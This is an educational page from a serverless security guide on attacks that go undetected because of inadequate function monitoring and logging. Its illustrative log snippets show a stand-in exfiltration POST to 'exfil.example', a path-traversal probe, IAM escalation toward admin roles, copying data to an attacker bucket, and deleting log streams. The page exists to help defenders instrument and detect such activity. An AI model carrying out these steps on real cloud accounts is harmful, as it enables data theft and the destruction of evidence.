# SAS-5: Inadequate Function Monitoring and Logging - Attack Vectors

## Table of Contents
- [Understanding the Attack Vectors](#understanding-the-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Activity That Goes Undetected](#activity-that-goes-undetected)
- [Chaining Under the Radar](#chaining-under-the-radar)

## Understanding the Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can instrument, detect, and shut down this activity in serverless systems you own or are authorised to test.

For most weaknesses, an "attack vector" is the payload or trick the attacker uses. SAS-5 is different. The weakness is not *how* an attacker acts—it is that **whatever they do goes unseen**. So the vectors below are framed as attacker activity that *succeeds quietly*: each is an ordinary malicious action that produces no alert, because the serverless application was never instrumented to notice it.

The attacker does not need to defeat your logging. They only need to operate inside its blind spots—which, with default serverless telemetry, is almost everywhere. The ephemeral, distributed, event-driven nature of functions means their footprints scatter across dozens of short-lived invocations and never assemble into a picture anyone is looking at.

### Core Attack Flow

```
1. Enter quietly
   |
   Trigger a function through an event source no one is watching
2. Operate in the blind spots
   |
   Act across many short-lived invocations; each looks unremarkable
3. Avoid the only alarm that exists
   |
   Produce "successful" responses; don't trip the crude 5xx alert
4. Persist / exfiltrate / spend
   |
   Continue for weeks — the first out-of-band signal is a bill or a third party
```

## Activity That Goes Undetected

### 1. Injection Attempts Spread Across Functions

An attacker fuzzes an event field (an SAS-1 injection attempt) that flows through several downstream functions. Each function logs only `START`/`END`, so the payloads, the outcomes, and the repetition are never recorded.

```
# The attacker sends 4,000 crafted events over an hour to an ingest function.
# Default telemetry for each invocation:
  START RequestId: a91...  END RequestId: a91...  REPORT Duration: 30 ms
# Nowhere recorded: the payload, that it was malformed, that it was retried,
# that ALL 4,000 came from one source. The campaign is invisible.
```

**Why undetected**: no security-event logging of validation failures, no correlation of a single source across invocations, no per-source rate baseline.

### 2. Credential and Role Abuse

An attacker who controls a function (or a leaked deployment credential) assumes its IAM role and uses it against services the function never normally touches. The calls are technically *authorised*, so nothing errors.

```
# Normal behaviour for order-fn:
  dynamodb:GetItem  Orders
# Sudden behaviour under the same role:
  s3:GetObject      backups/*
  iam:ListRoles
  sts:AssumeRole    arn:...:role/admin-*
# No alert: the role is allowed to do this, and no baseline flags the change.
```

**Why undetected**: over-broad role plus no anomaly detection on *which* services a function calls; CloudTrail either off or never correlated to the function.

### 3. Low-and-Slow Reconnaissance

Rather than one loud scan, the attacker probes with many small invocations spread over time—enumerating resources, error messages, and permissions—each request indistinguishable from legitimate traffic.

```
# Over days, a handful of probes per hour:
  GET /orders/../config        -> handled, logged only as a normal invocation
  GET /orders/00000001         -> object-id enumeration
  malformed token, then valid  -> mapping which inputs change behaviour
# No single spike, so no threshold alarm fires; no correlation joins the dots.
```

**Why undetected**: alerting (if any) is threshold-based on volume; there is no behavioural baseline and no correlation of a slow campaign from one identity.

### 4. Data Exfiltration Through a Function

A function with legitimate read access to a datastore is turned into an exfiltration channel: it reads records and ships them to an attacker-controlled endpoint. The reads look normal and the egress is never inspected.

```
# The function is supposed to read one record per request.
# Under abuse it reads thousands and POSTs them out:
  dynamodb:Scan   Customers   (10,000 items)
  POST https://exfil.example/collect   { ...records... }
# Logged as: START / END. No record volume metric, no egress-destination logging.
```

**Why undetected**: logs capture neither the *volume* of data read nor the *destination* of outbound calls; no alert on anomalous read counts or unknown egress hosts.

### 5. Denial-of-Wallet Cost Spike

A publicly reachable function is triggered in a tight loop. Because billing is per-invocation, the damage is financial and accrues silently—there is no crash to alert on.

```
Invocations/min:  12  11  9  |  8,900  9,400  9,100  9,300  ...  (sustained)
Estimated charge: climbing linearly with every minute
# No alarm on invocation rate. No alarm on estimated charges.
# First human signal: the monthly invoice. (This IS SAS-8, unseen.)
```

**Why undetected**: cost and invocation rate are not treated as security signals; no CloudWatch alarm on `Invocations` or `EstimatedCharges`, no concurrency cap to force a visible throttle.

### 6. Privilege Abuse Within Allowed Scope

The attacker stays inside what the function is permitted to do, but uses it abusively—bulk operations, cross-tenant reads, or repeated privileged actions—so every request returns `200`.

```
# Function may read any tenant's record by design flaw; attacker walks all tenants:
  GET /account/tenant-0001/data   200
  GET /account/tenant-0002/data   200
  ...                              200
# Only successful responses. An error-only alerting strategy sees nothing.
```

**Why undetected**: alerting keys on errors, not on *successful-but-abusive* patterns; no per-identity, per-tenant access logging to reveal the sweep.

### 7. Log Tampering and Evidence Destruction

If the function's own role can write to and manage its log group, an attacker who controls the function can suppress or delete the very evidence of their activity.

```
# The compromised function's role includes:
  logs:DeleteLogStream, logs:PutRetentionPolicy
# Attacker shortens retention or deletes streams after acting.
# Even the operational trail is now gone.
```

**Why undetected**: logs are not shipped off-account in real time, retention is mutable by the workload, and there is no tamper alert on log-group changes.

### 8. Blind Spots Between Managed Services

Actions that happen entirely inside managed services—an object copied in S3, a policy attached in IAM, a table exported—never touch the function logs at all.

```
# No function is even involved; the attacker uses stolen role credentials directly:
  s3:CopyObject   prod-data/*  ->  attacker-bucket/*
  iam:AttachRolePolicy  AdministratorAccess
# If CloudTrail data events aren't captured, none of this appears anywhere.
```

**Why undetected**: monitoring stops at the function boundary; control-plane and data-plane events from managed services are not captured or correlated.

## Chaining Under the Radar

Individually quiet actions combine into a full, unseen breach precisely because no layer is watching the seams between them:

```
Recon via slow probes        -> map an over-broad function role
        +
Role abuse (no baseline)      -> assume role, reach the backups bucket
        +
Exfil through the function    -> read + POST records out, no egress logging
        +
Log tampering                 -> shorten retention, delete streams
        =  full data breach with no alert, discovered later by a third party
```

Another common chain—the economic one:

```
Public trigger, no auth check  -> attacker invokes in a loop
        -> no invocation-rate alarm, no concurrency cap
        -> cost climbs for days across thousands of ephemeral invocations
        -> first detection is the invoice  (denial-of-wallet, SAS-8)
```

## Key Takeaways

1. **The vector is silence, not cleverness**—attackers succeed by operating where no telemetry exists, which by default is nearly everywhere.
2. **Distribution is the attacker's friend**—spreading activity across many short-lived invocations defeats per-function, uncorrelated logging.
3. **"Success" hides abuse**—error-only alerting misses authorised-but-malicious reads, role use, and exfiltration.
4. **Cost is an attack surface**—denial-of-wallet is invisible without invocation and spend alarms.
5. **Unprotected logs get erased**—if the workload can manage its own log store, the evidence is destructible.

## Next Steps

- **[Prevention Guide](prevention.md)**: Instrument security logging, correlation, tracing, and anomaly alerting
- **[Code Examples](examples.md)**: Vulnerable vs. secure Lambda logging, tracing, and alerts
- **[Overview](overview.md)**: Why serverless is blind by default
